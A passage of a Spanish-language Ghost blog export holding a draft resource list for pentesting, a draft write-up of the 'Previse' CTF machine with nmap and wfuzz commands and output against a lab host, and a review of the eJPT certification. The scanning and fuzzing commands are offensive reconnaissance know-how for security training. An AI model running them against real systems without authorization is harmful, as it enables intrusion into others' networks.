\"],[0,[5],1,\"https://github.com/DominicBreuker/pspy\"]]],[1,\"p\",[[0,[],0,\"man tar -h\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>gitools <a href=\"https://github.com/internetwache/GitTools\">https://github.com/internetwache/GitTools</a></p><p>jwt <a href=\"https://jwt.io/\">https://jwt.io/</a> <a href=\"https://pyjwt.readthedocs.io/en/stable/\">https://pyjwt.readthedocs.io/en/stable/</a></p><p>aws lambda <a href=\"https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html\">https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html</a></p><p>ssti <a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection\">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---basic-injection</a></p><p>pspy <a href=\"https://github.com/DominicBreuker/pspy\">https://github.com/DominicBreuker/pspy</a></p><p>man tar -h</p>",
            "comment_id": "620ddc972d908900617a7696",
            "plaintext": "gitools https://github.com/internetwache/GitTools\n\njwt https://jwt.io/ https://pyjwt.readthedocs.io/en/stable/\n\naws lambda https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html\n\nssti https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---basic-injection\n\npspy https://github.com/DominicBreuker/pspy\n\nman tar -h",
            "feature_image": "__GHOST_URL__/content/images/2022/02/epsilon.png",
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-17T05:26:47.000Z",
            "updated_at": "2022-02-17T05:29:30.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c10057530148112380",
            "uuid": "8f1d49d0-e1d9-4b3c-a78f-5b8b3452ad07",
            "title": "CTF - Previse WriteUp",
            "slug": "ctf-previse",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"sh\",\"code\":\"nmap -p- --open -sS -T5 -n -Pn 10.10.11.104 -oG allPorts\\nDiscovered open port 22/tcp on 10.10.11.104\\nDiscovered open port 80/tcp on 10.10.11.104\"}],[\"code\",{\"language\":\"sh\",\"code\":\"wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\"http://previse.htb/FUZZ.php\\\"\\n=====================================================================\\nID           Response   Lines    Word       Chars       Payload     \\n=====================================================================         \\n000000015:   302        71 L     164 W      2801 Ch     \\\"index\\\"               \\n000000053:   200        53 L     138 W      2224 Ch     \\\"login\\\"               \\n000000094:   302        112 L    263 W      4914 Ch     \\\"files\\\"               \\n000000191:   200        20 L     64 W       980 Ch      \\\"header\\\"             \\n000000333:   200        5 L      14 W       217 Ch      \\\"footer\\\"             \\n000000017:   302        0 L      0 W        0 Ch        \\\"download\\\"           \\n000000764:   302        74 L     176 W      2966 Ch     \\\"status\\\" \\n000001225:   302        0 L      0 W        0 Ch        \\\"logout\\\"  \\n000001389:   302        93 L     238 W      3994 Ch     \\\"accounts\\\" \\n000001490:   200        0 L      0 W        0 Ch        \\\"config\\\"   \\n000000200:   200        31 L     60 W       1248 Ch     \\\"nav\\\"    \\n000002271:   302        0 L      0 W        0 Ch        \\\"logs\\\" \"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-25.png\",\"width\":283,\"height\":198}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"Una máquina de dificultad fácil. Una de las últimas días antes de presentarme al eJPT.\"]]],[1,\"p\",[[0,[],0,\"Iniciamos el escaneo de puertos con nmap donde visualizo los siguientes puertos interesantes.\"]]],[10,0],[1,\"p\",[[0,[],0,\"Pruebo a fuzzear la web\"]]],[10,1],[10,2],[1,\"p\",[]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Una máquina de dificultad fácil. Una de las últimas días antes de presentarme al eJPT.</p><p>Iniciamos el escaneo de puertos con nmap donde visualizo los siguientes puertos interesantes.</p><pre><code class=\"language-sh\">nmap -p- --open -sS -T5 -n -Pn 10.10.11.104 -oG allPorts\nDiscovered open port 22/tcp on 10.10.11.104\nDiscovered open port 80/tcp on 10.10.11.104</code></pre><p>Pruebo a fuzzear la web</p><pre><code class=\"language-sh\">wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://previse.htb/FUZZ.php\"\n=====================================================================\nID           Response   Lines    Word       Chars       Payload     \n=====================================================================         \n000000015:   302        71 L     164 W      2801 Ch     \"index\"               \n000000053:   200        53 L     138 W      2224 Ch     \"login\"               \n000000094:   302        112 L    263 W      4914 Ch     \"files\"               \n000000191:   200        20 L     64 W       980 Ch      \"header\"             \n000000333:   200        5 L      14 W       217 Ch      \"footer\"             \n000000017:   302        0 L      0 W        0 Ch        \"download\"           \n000000764:   302        74 L     176 W      2966 Ch     \"status\" \n000001225:   302        0 L      0 W        0 Ch        \"logout\"  \n000001389:   302        93 L     238 W      3994 Ch     \"accounts\" \n000001490:   200        0 L      0 W        0 Ch        \"config\"   \n000000200:   200        31 L     60 W       1248 Ch     \"nav\"    \n000002271:   302        0 L      0 W        0 Ch        \"logs\" </code></pre><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-25.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"283\" height=\"198\"></figure><p></p>",
            "comment_id": "621527a5cc3ae00061bdcd79",
            "plaintext": "Una máquina de dificultad fácil. Una de las últimas días antes de presentarme al eJPT.\n\nIniciamos el escaneo de puertos con nmap donde visualizo los siguientes puertos interesantes.\n\nnmap -p- --open -sS -T5 -n -Pn 10.10.11.104 -oG allPorts\nDiscovered open port 22/tcp on 10.10.11.104\nDiscovered open port 80/tcp on 10.10.11.104\n\nPruebo a fuzzear la web\n\nwfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://previse.htb/FUZZ.php\"\n=====================================================================\nID           Response   Lines    Word       Chars       Payload     \n=====================================================================         \n000000015:   302        71 L     164 W      2801 Ch     \"index\"               \n000000053:   200        53 L     138 W      2224 Ch     \"login\"               \n000000094:   302        112 L    263 W      4914 Ch     \"files\"               \n000000191:   200        20 L     64 W       980 Ch      \"header\"             \n000000333:   200        5 L      14 W       217 Ch      \"footer\"             \n000000017:   302        0 L      0 W        0 Ch        \"download\"           \n000000764:   302        74 L     176 W      2966 Ch     \"status\" \n000001225:   302        0 L      0 W        0 Ch        \"logout\"  \n000001389:   302        93 L     238 W      3994 Ch     \"accounts\" \n000001490:   200        0 L      0 W        0 Ch        \"config\"   \n000000200:   200        31 L     60 W       1248 Ch     \"nav\"    \n000002271:   302        0 L      0 W        0 Ch        \"logs\" \n\n",
            "feature_image": "__GHOST_URL__/content/images/2022/02/Previse.png",
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-22T18:12:53.000Z",
            "updated_at": "2022-02-22T19:09:31.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c10057530148112381",
            "uuid": "d05fe1ed-ffc3-44f8-8aca-bdc1aa9e6939",
            "title": "Review del eJPT en 2022",
            "slug": "ejpt-review-2022",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-27.png\",\"width\":1819,\"height\":889,\"cardWidth\":\"wide\",\"caption\":\"https://pauljerimy.com/security-certification-roadmap/\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-28.png\",\"width\":967,\"height\":319}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/image-30.png\",\"width\":674,\"height\":492,\"caption\":\"https://verified.elearnsecurity.com/certificates/cdbd4f81-182a-42f7-a48c-8c5199fe4b1d\"}]],\"markups\":[[\"a\",[\"href\",\"https://elearnsecurity.com/product/ejpt-certification/\"]],[\"strong\"],[\"a\",[\"href\",\"https://pauljerimy.com/security-certification-roadmap/\"]],[\"a\",[\"href\",\"https://elearnsecurity.com/?post_type=product&p=10890\"]],[\"a\",[\"href\",\"https://my.ine.com/path/a223968e-3a74-45ed-884d-2d16760b8bbd\"]],[\"a\",[\"href\",\"https://www.reddit.com/r/eLearnSecurity/comments/jhbx2d/ejpt_routing_advice/\"]],[\"a\",[\"href\",\"https://elearnsecurity.com/product/ewpt-certification/\"]],[\"a\",[\"href\",\"https://elearnsecurity.com/product/ecpptv2-certification/\"]],[\"a\",[\"href\",\"https://www.offensive-security.com/pwk-oscp/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Hace unos días me presenté al examen para obtener la certificación del \"],[0,[0,1],2,\"eJPT \"],[0,[],0,\"(eLearnSecurity Junior Penetration Tester). Para los que no lo sepáis, es una de las varias certificaciones con cierta reputación que existen dentro del ámbito del pentesting.\"]]],[1,\"p\",[[0,[],0,\"Dejo un \"],[0,[2],1,\"link\"],[0,[],0,\" con el roadmap de todas las certificaciones que existen sobre redes y ciberseguridad, donde puedes ver los \"],[0,[1],1,\"CCNA \"],[0,[],0,\"de Cisco, las relativas a Cloud Architect (AWS, Google Cloud y Azure) y otras más del contexto de la ciberseguridad como el \"],[0,[1],1,\"OSCP\"],[0,[],0,\".\"]]],[10,0],[1,\"p\",[[0,[],0,\"Llegados hasta aquí, analizaré en detalle los siguientes puntos.\"]]],[1,\"h2\",[[0,[],0,\"💻 Cómo fue la experiencia del examen\"]]],[1,\"p\",[[0,[],0,\"El proceso para obtener el certificado es el siguiente.\"]]],[3,\"ul\",[[[0,[1],1,\"Paso 1:\"],[0,[],0,\" Compra la opción de presentarte al examen \"],[0,[3],1,\"aquí\"],[0,[],0,\". (son 200$ que al cambio se quedan en unos 177€)\"]],[[0,[1],1,\"Paso 2:\"],[0,[],0,\" Desde el momento de la compra, tienes 180 días para prepararte el examen en \"],[0,[4],1,\"INE\"],[0,[],0,\" siguiendo el plan de estudio que tienen para el \"],[0,[1],1,\"eJPT\"],[0,[],0,\". La preparación para este examen es totalmente gratuita y tienes laboratorios prácticos al estilo CTF. Si cuentas con conocimientos previos en ámbito de redes, ciberseguridad y has hecho algún CTF, no necesitas mucho más que repasar su plan de estudios para presentarte al examen.\"]],[[0,[1],1,\"Paso 3:\"],[0,[],0,\" Inicia el proceso del examen. Desde ese momento tienes 3 días para terminarlo. Si suspendes, tienes una opción de recuperación antes de 14 días.\"]]]],[1,\"p\",[[0,[],0,\"Los resultados del examen los recibes directamente. El formato del examen son 20 preguntas tipo test, algunas de ellas con opción múltiple, y tienes que aprobar un 75% del examen. Es decir, solo puedes fallar 5 de las 20 preguntas.\"]]],[1,\"p\",[[0,[],0,\" Los 3 días son más que suficientes para aprobarlo. En mi caso, leí de mucha gente que lo suele terminar en unos 2 días y medio, siempre dependiendo de la preparación con la que te enfrentas a la prueba.\"]]],[1,\"p\",[[0,[],0,\"Yo lo terminé en menos de 24 horas, unas 13-14 horas efectivas (sin contar los descansos).\"]]],[1,\"p\",[[0,[],0,\"Era mi primer examen de este tipo y la experiencia fue muy positiva. Tuve 2 momentos en los que me atasqué, al inicio del examen (si lees otras \"],[0,[5],1,\"reviews \"],[0,[],0,\"del eJPT debe ser bastante común el bloqueo de esta parte) y otra al final, a falta de contestar 2 preguntas del test. El resto de preguntas se contestan de forma bastante fácil.\"]]],[1,\"h2\",[[0,[],0,\"❓ ¿Necesito el eJPT?\"]]],[1,\"p\",[[0,[],0,\"Como muchas de las preguntas que te puedes hacer en la vida, la respuesta es \\\"depende\\\". Si te quieres iniciar en el mundo del Pentesting o Hacking Ético, es desde luego recomendable obtener el \"],[0,[1],1,\"eJPT\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"En mi caso, me sirvió como termómetro del nivel de conocimiento necesario para sacar este tipo de certificaciones, ya que en el futuro me gustaría aspirar a otras como el \"],[0,[6,1],2,\"eWPT\"],[0,[1],0,\", \"],[0,[7],1,\"eCPPTv2\"],[0,[],1,\" \"],[0,[],0,\"o incluso el \"],[0,[8,1],2,\"OSCP\"],[0,[],0,\".\"]]],[1,\"h2\",[[0,[],0,\"🏋️‍♂️ ¿Cuál es la dificultad?\"]]],[1,\"p\",[[0,[],0,\"El \"],[0,[1],1,\"eJPT \"],[0,[],0,\"es una de las certificaciones más básicas que existen en el mundo del Pentesting. Pero que esto no te lleve a un engaño. El hecho de catalogarla como básica no significa que sea para todo el mundo. Requiere de muchas horas de estudio y dedicación, sobre todo si no has invertido antes tiempo en plataformas CTF o el conocimiento que tienes sobre software, redes y vulnerabilidades es pequeño. En cualquier caso, el plan de estudio que tiene eLearningSecurity de forma gratuita es recomendable.\"]]],[1,\"h2\",[[0,[],0,\"🔑 Consejos para el examen\"]]],[1,\"p\",[[0,[],0,\"Cuando inicias el proceso, te descargas un archivo ZIP con una carta de compromiso como la que recibirías en la realidad en una empresa donde vas a realizar un pentesting. Lee cuidadosamente esta carta al inicio y repite la lectura eventualmente durante el examen. Encontrarás pistas que en un inicio pueden pasar desapercibidas.\"]]],[10,1],[1,\"p\",[[0,[],0,\"El formato del pentesting que harás es de tipo BlackBox, por lo que no tendrás mucha información del entorno en el que te encuentras. En el ZIP inicial te entregarán un archivo PCAP que tendrás que abrir de manera local con Wireshark para tratar de extraer toda la información posible. Si no haces esto bien, no puedes continuar con el examen y es la parte donde la mayor parte de la gente se encuentra bloqueada.\"]]],[1,\"blockquote\",[[0,[],0,\"Enumera, enumera y enumera. Anota todo. No es un CTF.\"]]],[1,\"p\",[[0,[],0,\"En mi caso me preparé un esquema de como estaba constituida la red según iba recopilando información. Mantén este esquema actualizado. Es un buen modo de poder volver atrás y tener una visión global en todo momento. Además, siendo el examen de varios días, necesitas una manera de ponerte en situación rápidamente.\"]]],[1,\"p\",[[0,[],0,\"El curso gratuito hace mucho hincapié en herramientas como \"],[0,[1],1,\"Metasploit\"],[0,[],0,\". En mi caso, no me gusta mucho utilizarla porque en el 99% de los casos puedes ejecutar los exploits de forma más \\\"manual\\\" y es una buena forma de aprendizaje. En cualquier caso, durante el examen tuve que emplearla una vez. Con saber como buscar, configurar y ejecutar exploits en ella es suficiente. No necesitas ser un experto. Dedica más esfuerzos en aprender las siguientes herramientas que te serán de más utilidad durante el examen.\"]]],[3,\"ul\",[[[0,[],0,\"Nmap (Con especial hincapié en esta)\"]],[[0,[],0,\"BurpSuite\"]],[[0,[],0,\"Hydra\"]],[[0,[],0,\"Smbclient\"]],[[0,[],0,\"Sqlmap\"]]]],[1,\"h2\",[[0,[],0,\"🎓 Conclusión\"]]],[1,\"p\",[[0,[],0,\"Estoy muy contento con haber tomado la decisión de obtener esta certificación. La experiencia del examen ha sido muy buena y divertida. Finalmente, aunque pensaba que todas las preguntas del tipo test las tenía bien, fallé 1 de ellas obteniendo un 95% del resultado final.\"]]],[1,\"p\",[[0,[],0,\"Intuyo cuál pudo ser la que estaba mal, pero en cualquier caso no te fíes. Lee bien todas y cada una de ellas. Repasa lo que puedas y anota todo lo que haces. En esta certificación no debes entregar un reporte de las vulnerabilidades, pero tener todo anotado te puede servir a ti a la hora de repasar el examen al final.\"]]],[1,\"p\",[[0,[],0,\"La recompensa, si todo ha ido bien, es la certificación que ves a continuación.\"]]],[10,2],[1,\"h3\",[[0,[],0,\"👨‍💻 Happy Hacking! \"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Hace unos días me presenté al examen para obtener la certificación del <a href=\"https://elearnsecurity.com/product/ejpt-certification/\"><strong>eJPT </strong></a>(eLearnSecurity Junior Penetration Tester). Para los que no lo sepáis, es una de las varias certificaciones con cierta reputación que existen dentro del ámbito del pentesting.</p><p>Dejo un <a href=\"https://pauljerimy.com/security-certification-roadmap/\">link</a> con el roadmap de todas las certificaciones que existen sobre redes y ciberseguridad, donde puedes ver los <strong>CCNA </strong>de Cisco, las relativas a Cloud Architect (AWS, Google Cloud y Azure) y otras más del contexto de la ciberseguridad como el <strong>OSCP</strong>.</p><figure class=\"kg-card kg-image-card kg-width-wide kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/02/image-27.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1819\" height=\"889\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-27.png 600w, __GHOST_URL__/content/images/size/w1000/2022/02/image-27.png 1000w, __GHOST_URL__/content/images/size/w1600/2022/02/image-27.png 1600w, __GHOST_URL__/content/images/2022/02/image-27.png 1819w\" sizes=\"(min-width: 1200px) 1200px\"><figcaption>https://pauljerimy.com/security-certification-roadmap/</figcaption></figure><p>Llegados hasta aquí, analizaré en detalle los siguientes puntos.</p><h2 id=\"%F0%9F%92%BB-c%C3%B3mo-fue-la-experiencia-del-examen\">💻 Cómo fue la experiencia del examen</h2><p>El proceso para obtener el certificado es el siguiente.</p><ul><li><strong>Paso 1:</strong> Compra la opción de presentarte al examen <a href=\"https://elearnsecurity.com/?post_type=product&amp;p=10890\">aquí</a>. (son 200$ que al cambio se quedan en unos 177€)</li><li><strong>Paso 2:</strong> Desde el momento de la compra, tienes 180 días para prepararte el examen en <a href=\"https://my.ine.com/path/a223968e-3a74-45ed-884d-2d16760b8bbd\">INE</a> siguiendo el plan de estudio que tienen para el <strong>eJPT</strong>. La preparación para este examen es totalmente gratuita y tienes laboratorios prácticos al estilo CTF. Si cuentas con conocimientos previos en ámbito de redes, ciberseguridad y has hecho algún CTF, no necesitas mucho más que repasar su plan de estudios para presentarte al examen.</li><li><strong>Paso 3:</strong> Inicia el proceso del examen. Desde ese momento tienes 3 días para terminarlo. Si suspendes, tienes una opción de recuperación antes de 14 días.</li></ul><p>Los resultados del examen los recibes directamente. El formato del examen son 20 preguntas tipo test, algunas de ellas con opción múltiple, y tienes que aprobar un 75% del examen. Es decir, solo puedes fallar 5 de las 20 preguntas.</p><p> Los 3 días son más que suficientes para aprobarlo. En mi caso, leí de mucha gente que lo suele terminar en unos 2 días y medio, siempre dependiendo de la preparación con la que te enfrentas a la prueba.</p><p>Yo lo terminé en menos de 24 horas, unas 13-14 horas efectivas (sin contar los descansos).</p><p>Era mi primer examen de este tipo y la experiencia fue muy positiva. Tuve 2 momentos en los que me atasqué, al inicio del examen (si lees otras <a href=\"https://www.reddit.com/r/eLearnSecurity/comments/jhbx2d/ejpt_routing_advice/\">reviews </a>del eJPT debe ser bastante común el bloqueo de esta parte) y otra al final, a falta de contestar 2 preguntas del test. El resto de preguntas se contestan de forma bastante fácil.</p><h2 id=\"%E2%9D%93-%C2%BFnecesito-el-ejpt\">❓ ¿Necesito el eJPT?</h2><p>Como muchas de las preguntas que te puedes hacer en la vida, la respuesta es \"depende\". Si te quieres iniciar en el mundo del Pentesting o Hacking Ético, es desde luego recomendable obtener el <strong>eJPT</strong>.</p><p>En mi caso, me sirvió como termómetro del nivel de conocimiento necesario para sacar este tipo de certificaciones, ya que en el futuro me gustaría aspirar a otras como el <a href=\"https://elearnsecurity.com/product/ewpt-certification/\"><strong>eWPT</strong></a><strong>, <a href=\"https://elearnsecurity.com/product/ecpptv2-certification/\">eCPPTv2</a> </strong>o incluso el <a href=\"https://www.offensive-security.com/pwk-oscp/\"><strong>OSCP</strong></a>.</p><h2 id=\"%F0%9F%8F%8B%EF%B8%8F%E2%80%8D%E2%99%82%EF%B8%8F-%C2%BFcu%C3%A1l-es-la-dificultad\">🏋️‍♂️ ¿Cuál es la dificultad?</h2><p>El <strong>eJPT </strong>es una de las certificaciones más básicas que existen en el mundo del Pentesting. Pero que esto no te lleve a un engaño. El hecho de catalogarla como básica no significa que sea para todo el mundo. Requiere de muchas horas de estudio y dedicación, sobre todo si no has invertido antes tiempo en plataformas CTF o el conocimiento que tienes sobre software, redes y vulnerabilidades es pequeño. En cualquier caso, el plan de estudio que tiene eLearningSecurity de forma gratuita es recomendable.</p><h2 id=\"%F0%9F%94%91-consejos-para-el-examen\">🔑 Consejos para el examen</h2><p>Cuando inicias el proceso, te descargas un archivo ZIP con una carta de compromiso como la que recibirías en la realidad en una empresa donde vas a realizar un pentesting. Lee cuidadosamente esta carta al inicio y repite la lectura eventualmente durante el examen. Encontrarás pistas que en un inicio pueden pasar desapercibidas.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/image-28.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"967\" height=\"319\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-28.png 600w, __GHOST_URL__/content/images/2022/02/image-28.png 967w\" sizes=\"(min-width: 720px) 720px\"></figure><p>El formato del pentesting que harás es de tipo BlackBox, por lo que no tendrás mucha información del entorno en el que te encuentras. En el ZIP inicial te entregarán un archivo PCAP que tendrás que abrir de manera local con Wireshark para tratar de extraer toda la información posible. Si no haces esto bien, no puedes continuar con el examen y es la parte donde la mayor parte de la gente se encuentra bloqueada.</p><blockquote>Enumera, enumera y enumera. Anota todo. No es un CTF.</blockquote><p>En mi caso me preparé un esquema de como estaba constituida la red según iba recopilando información. Mantén este esquema actualizado. Es un buen modo de poder volver atrás y tener una visión global en todo momento. Además, siendo el examen de varios días, necesitas una manera de ponerte en situación rápidamente.</p><p>El curso gratuito hace mucho hincapié en herramientas como <strong>Metasploit</strong>. En mi caso, no me gusta mucho utilizarla porque en el 99% de los casos puedes ejecutar los exploits de forma más \"manual\" y es una buena forma de aprendizaje. En cualquier caso, durante el examen tuve que emplearla una vez. Con saber como buscar, configurar y ejecutar exploits en ella es suficiente. No necesitas ser un experto. Dedica más esfuerzos en aprender las siguientes herramientas que te serán de más utilidad durante el examen.</p><ul><li>Nmap (Con especial hincapié en esta)</li><li>BurpSuite</li><li>Hydra</li><li>Smbclient</li><li>Sqlmap</li></ul><h2 id=\"%F0%9F%8E%93-conclusi%C3%B3n\">🎓 Conclusión</h2><p>Estoy muy contento con haber tomado la decisión de obtener esta certificación. La experiencia del examen ha sido muy buena y divertida. Finalmente, aunque pensaba que todas las preguntas del tipo test las tenía bien, fallé 1 de ellas obteniendo un 95% del resultado final.</p><p>Intuyo cuál pudo ser la que estaba mal, pero en cualquier caso no te fíes. Lee bien todas y cada una de ellas. Repasa lo que puedas y anota todo lo que haces. En esta certificación no debes entregar un reporte de las vulnerabilidades, pero tener todo anotado te puede servir a ti a la hora de repasar el examen al final.</p><p>La recompensa, si todo ha ido bien, es la certificación que ves a continuación.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/02/image-30.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"674\" height=\"492\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/image-30.png 600w, __GHOST_URL__/content/images/2022/02/image-30.png 674w\"><figcaption>https://verified.elearnsecurity.com/certificates/cdbd4f81-182a-42f7-a48c-8c5199fe4b1d</figcaption></figure><h3 id=\"%F0%9F%91%A8%E2%80%8D%F0%9F%92%BB-happy-hacking\">👨‍💻 Happy Hacking! </h3>",
            "comment_id": "621b9615155b62006734426d",
            "plaintext": "Hace unos días me presenté al examen para obtener la certificación del eJPT (eLearnSecurity Junior Penetration Tester). Para los que no lo sepáis, es una de las varias certificaciones con cierta reputación que existen dentro del ámbito del pentesting.\n\nDejo un link con el roadmap de todas las certificaciones que existen sobre redes y ciberseguridad, donde puedes ver los CCNA de Cisco, las relativas a Cloud Architect (AWS, Google Cloud y Azure) y otras más del contexto de la ciberseguridad como el OSCP.\n\nLlegados hasta aquí, analizaré en detalle los siguientes puntos.\n\n\n💻 Cómo fue la experiencia del examen\n\nEl proceso para obtener el certificado es el siguiente.\n\n * Paso 1: Compra la opción de presentarte al examen aquí. (son 200$ que al cambio se quedan en unos 177€)\n * Paso 2: Desde el momento de la compra, tienes 180 días para prepararte el examen en INE siguiendo el plan de estudio que tienen para el eJPT. La preparación para este examen es totalmente gratuita y tienes laboratorios prácticos al estilo CTF. Si cuentas con conocimientos previos en ámbito de redes, ciberseguridad y has hecho algún CTF, no necesitas mucho más que repasar su plan de estudios para presentarte al examen.\n * Paso 3: Inicia el proceso del examen. Desde ese momento tienes 3 días para terminarlo. Si suspendes, tienes una opción de recuperación antes de 14 días.\n\nLos resultados del examen los recibes directamente. El formato del examen son 20 preguntas tipo test, algunas de ellas con opción múltiple, y tienes que aprobar un 75% del examen. Es decir, solo puedes fallar 5 de las 20 preguntas.\n\nLos 3 días son más que suficientes para aprobarlo. En mi caso, leí de mucha gente que lo suele terminar en unos 2 días y medio, siempre dependiendo de la preparación con la que te enfrentas a la prueba.\n\nYo lo terminé en menos de 24 horas, unas 13-14 horas efectivas (sin contar los descansos).\n\nEra mi primer examen de este tipo y la experiencia fue muy positiva. Tuve 2 momentos en los que me atasqué, al inicio del examen (si lees otras reviews del eJPT debe ser bastante común el bloqueo de esta parte) y otra al final, a falta de contestar 2 preguntas del test. El resto de preguntas se contestan de forma bastante fácil.\n\n\n❓ ¿Necesito el eJPT?\n\nComo muchas de las preguntas que te puedes hacer en la vida, la respuesta es \"depende\". Si te quieres iniciar en el mundo del Pentesting o Hacking Ético, es desde luego recomendable obtener el eJPT.\n\nEn mi caso, me sirvió como termómetro del nivel de conocimiento necesario para sacar este tipo de certificaciones, ya que en el futuro me gustaría aspirar a otras como el eWPT, eCPPTv2 o incluso el OSCP.\n\n\n🏋️‍♂️ ¿Cuál es la dificultad?\n\nEl eJPT es una de las certificaciones más básicas que existen en el mundo del Pentesting. Pero que esto no te lleve a un engaño. El hecho de catalogarla como básica no significa que sea para todo el mundo. Requiere de muchas horas de estudio y dedicación, sobre todo si no has invertido antes tiempo en plataformas CTF o el conocimiento que tienes sobre software, redes y vulnerabilidades es pequeño. En cualquier caso, el plan de estudio que tiene eLearningSecurity de forma gratuita es recomendable.\n\n\n🔑 Consejos para el examen\n\nCuando inicias el proceso, te descargas un archivo ZIP con una carta de compromiso como la que recibirías en la realidad en una empresa donde vas a realizar un pentesting. Lee cuidadosamente esta carta al inicio y repite la lectura eventualmente durante el examen. Encontrarás pistas que en un inicio pueden pasar desapercibidas.\n\nEl formato del pentesting que harás es de tipo BlackBox, por lo que no tendrás mucha información del entorno en el que te encuentras. En el ZIP inicial te entregarán un archivo PCAP que tendrás que abrir de manera local con Wireshark para tratar de extraer toda la información posible. Si no haces esto bien, no puedes continuar con el examen y es la parte donde la mayor parte de la gente se encuentra bloqueada.\n\nEnumera, enumera y enumera. Anota todo. No es un CTF.\n\nEn mi caso me preparé un esquema de como estaba constituida la red según iba recopilando información. Mantén este esquema actualizado. Es un buen modo de poder volver atrás y tener una visión global en todo momento. Además, siendo el examen de varios días, necesitas una manera de ponerte en situación rápidamente.\n\nEl curso gratuito hace mucho hincapié en herramientas como Metasploit. En mi caso, no me gusta mucho utilizarla porque en el 99% de los casos puedes ejecutar los exploits de forma más \"manual\" y es una buena forma de aprendizaje. En cualquier caso, durante el examen tuve que emplearla una vez. Con saber como buscar, configurar y ejecutar exploits en ella es suficiente. No necesitas ser un experto. Dedica más esfuerzos en aprender las siguientes herramientas que te serán de más utilidad durante el examen.\n\n * Nmap (Con especial hincapié en esta)\n * BurpSuite\n * Hydra\n * Smbclient\n * Sqlmap\n\n\n🎓 Conclusión\n\nEstoy muy contento con haber tomado la decisión de obtener esta certificación. La experiencia del examen ha sido muy buena y divertida. Finalmente, aunque pensaba que todas las preguntas del tipo test las tenía bien, fallé 1 de ellas obteniendo un 95% del resultado final.\n\nIntuyo cuál pudo ser la que estaba mal, pero en cualquier caso no te fíes. Lee bien todas y cada una de ellas. Repasa lo que puedas y anota todo lo que haces. En esta certificación no debes entregar un reporte de las vulnerabilidades, pero tener todo anotado te puede servir a ti a la hora de repasar el examen al final.\n\nLa recompensa, si todo ha ido bien, es la certificación que ves a continuación.\n\n\n👨‍💻 Happy Hacking!",
            "feature_image": "__GHOST_URL__/content/images/2022/02/carbon.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-27T15:17:41.000Z",
            "updated_at": "2022-03-04T18:14:47.000Z",
            "published_at": "2022-02-28T08:00:00.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63ab7b885a13b30064643c43",
            "uuid": "5848ac5e-c605-481b-89bd-c6bacb1874d1",
            "title": "CTF - Soccer WriteUp",
            "slug": "ctf-soccer-write-up",
